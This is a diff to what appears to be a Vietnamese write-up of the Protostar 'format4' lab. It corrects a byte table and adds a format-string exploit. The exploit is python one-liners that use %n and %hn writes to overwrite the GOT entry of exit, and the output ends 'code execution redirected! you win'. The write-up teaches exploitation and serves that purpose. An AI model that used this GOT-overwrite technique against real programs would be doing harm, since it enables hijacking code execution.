@@ -92,13 +92,27 @@ Vậy là `GOT của exit(1) = 0x8049724`.
 ```
                  1      2      3
 hex     | \xb4 | \x84 | \x04 | \x08 |
-decimal |  68  |  85  |  258 |  513 |
-Đã có   |  16  |  68  |  85  |  258 |
-Cần     |  52  |  17  |  173 |  255 |
-para    |  12  |  13  |  14  |  15  |
+decimal | 180  |  388 |  516 |  776 |
+Đã có   |  16  |  180 | 388  |  516 |
+Cần     |  164 | 208  | 128  | 260  |
+para    |  4   |  5   |  6   |   7  |
 Addr:
-0x80496xx| f4  |  f5  |  f6  |  f7  |
+0x80497xx| 24  | 25   | 26   |  27  |
 
+```
+
+Tiến hành khai thác:
+
+```
+root@protostar:/opt/protostar/bin# python -c 'print "\x24\x97\x04\x08\x25\x97\x04\x08\x26\x97\x04\x08\x27\x97\x04\x08" + "%164x" + "%4$n" + "%208x" + "%5$n" + "%128x" + "%6$n" + "%260x" + "%7$n"' | ./format4
+$%&'                                                                                                                                                                 200                                                                                                                                                                                                        b7fd8420                                                                                                                        bffffb04                                                                                                                                                                                                                                                             8049724
+code execution redirected! you win
+```
+
+Cách điền`hn-hn` bạn có thể tự viết nó khi đã nắm vững hơn cách overwrite everywhere bằng format strings.
+
+```
+python -c 'print "\x24\x97\x04\x08\x26\x97\x04\x08" + "%" + str(0x84b4 - 8) + "x%4$hn" + "%" + str(0x10804 - 0x84b4) + "x%5$hn"' | ./format4
 ```
 
 ## Documents
